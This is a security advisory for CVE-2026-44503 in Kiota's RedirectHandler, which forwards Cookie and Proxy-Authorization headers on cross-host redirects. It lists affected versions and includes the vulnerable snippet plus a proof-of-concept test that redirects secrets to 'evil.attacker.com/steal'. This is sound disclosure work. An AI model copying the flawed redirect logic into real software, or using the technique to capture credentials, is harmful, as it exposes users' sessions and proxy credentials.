# [H] Kiota abstractions RedirectHandler leaks Cookie/Proxy-Authorization headers on cross-host redirect

## Summary
Severity: High
Advisory: GHSA-7j59-v9qr-6fq9
CVE: CVE-2026-44503
CWE: CWE-601
Ecosystem: Go, Maven, NuGet, PyPI, npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-7j59-v9qr-6fq9
Type: github-advisory

## Affected
- Maven: `com.microsoft.kiota:microsoft-kiota-abstractions` — affected >=0 <1.9.1
- NuGet: `Microsoft.Kiota.Abstractions` — affected >=0 <1.22.0
- PyPI: `microsoft-kiota-http` — affected >=0 <1.9.9
- npm: `kiota-typescript` — affected >=0 <1.0.0-preview.100
- Go: `github.com/microsoft/kiota-http-go` — affected >=0 <1.5.5

## Details
### Summary
The RedirectHandler middleware in microsoft/kiota-java (com.microsoft.kiota:microsoft-kiota-http-okHttp v1.9.0) and other Kiota libraries fails to strip sensitive HTTP headers when following 3xx redirects to a different host or scheme. 

This vulnerability is present in the RedirectHandlers for:

https://github.com/microsoft/kiota-dotnet
https://github.com/microsoft/kiota-java
https://github.com/microsoft/kiota-python
https://github.com/microsoft/kiota-typescript
https://github.com/microsoft/kiota-http-go


### Details
Only the Authorization header is removed; Cookie, Proxy-Authorization, and all custom headers are forwarded to the redirect target.

This is the default middleware in every kiota-java HTTP client created via KiotaClientFactory.create(). OkHttp's built-in redirect handler (which handles this correctly) is explicitly disabled at line 63 of KiotaClientFactory.java in favor of kiota's broken implementation.

Vulnerable code in RedirectHandler.java lines 107-116 (getRedirect method) in versions 1.90 and earlier:

```
boolean sameScheme = locationUrl.scheme().equalsIgnoreCase(requestUrl.scheme());
boolean sameHost = locationUrl.host().toString().equalsIgnoreCase(requestUrl.host().toString());
if (!sameScheme || !sameHost) {
requestBuilder.removeHeader("Authorization");
// BUG: Cookie, Proxy-Authorization, and all other headers are NOT removed
}
```


### PoC
1. Clone the repository:
git clone --depth 1 https://github.com/microsoft/kiota-java.git
cd kiota-java

2. Create the PoC test file at:
components/http/okHttp/src/test/java/com/microsoft/kiota/http/middleware/SecurityPoC.java

With this content:
```
package com.microsoft.kiota.http.middleware;
import static org.junit.jupiter.api.Assertions.*;
import com.microsoft.kiota.http.KiotaClientFactory;
import okhttp3.*;
import okhttp3.mockwebserver.*;
import org.junit.jupiter.api.Test;

public class SecurityPoC {
@Test
void crossHostRedirectLeaksCookies() throws Exception {
Request original = new Request.Builder()
.url("http://trusted.example.com/api")
.addHeader("Authorization", "Bearer token")
.addHeader("Cookie", "session=SECRET")
.addHeader("Proxy-Authorization", "Basic cHJveHk6cGFzcw==")
.build();
Response redirect = new Response.Builder()
.request(original).protocol(Protocol.HTTP_1_1)
.code(302).message("Found")
.header("Location", "http://evil.attacker.com/steal")
.body(ResponseBody.create("", MediaType.parse("text/plain")))
.build();
Request result = new RedirectHandler().getRedirect(original, redirect);
assertNotNull(result);
assertEquals("evil.attacker.com", result.url().host());
assertNull(result.header("Authorization")); // stripped (good)
assertEquals("session=SECRET", result.header("Cookie")); // LEAKED
assertEquals("Basic cHJveHk6cGFzcw==", result.header("Proxy-Authorization")); // LEAKED
}

@Test
void endToEndProof() throws Exception {
var evil = new MockWebServer();
evil.start();
evil.enqueue(new MockResponse().setResponseCode(200));
var trusted = new MockWebServer();
trusted.start();
trusted.enqueue(new MockResponse().setResponseCode(302)
.setHeader("Location", evil.url("/steal")));
OkHttpClient client = KiotaClientFactory.create(
new Interceptor[]{new RedirectHandler()}).build();
client.newCall(new Request.Builder().url(trusted.url("/api"))
.addHeader("Cookie", "session=SECRET").build()).execute();
trusted.takeRequest();
RecordedRequest captured = evil.takeRequest();
assertEquals("session=SECRET", captured.getHeader("Cookie")); // LEAKED to evil server
evil.shutdown();
trusted.shutdown();
}
}
```

3. Run the tests:
./gradlew :components:http:okHttp:test --tests "com.microsoft.kiota.http.middleware.SecurityPoC"

4. Result: BUILD SUCCESSFUL, 2 tests passed, 0 failures.
Both tests confirm Cookie and Proxy-Authorization headers are sent to the attacker's server on cross-host redirect.

### Impact
The kiota-java bug is more severe because it leaks ALL sensitive headers simultaneously (Cookie + Proxy-Authorization + custom auth headers), not just one type.

Attack scenario: An attacker who can trigger a cross-origin redirect from a trusted API (via open redirect, MITM, or DNS rebinding) captures the victim's session cookies, proxy credentials, and API keys from the redirected request.

Impact:
- Session hijacking via leaked Cookie headers
- Corporate proxy credential theft via leaked Proxy-Authorization
- API key theft via leaked custom auth headers (X-API-Key, etc.)

All consumers of kiota-java are affected, including Microsoft Graph SDK for Java.

## References
- https://github.com/microsoft/kiota-java/security/advisories/GHSA-7j59-v9qr-6fq9
- https://nvd.nist.gov/vuln/detail/CVE-2026-44503
- https://github.com/advisories/GHSA-7j59-v9qr-6fq9
- https://github.com/microsoft/kiota-java
- https://github.com/pypa/advisory-database/tree/main/vulns/microsoft-kiota-http/PYSEC-2026-2647.yaml
- https://pypi.org/project/microsoft-kiota-http
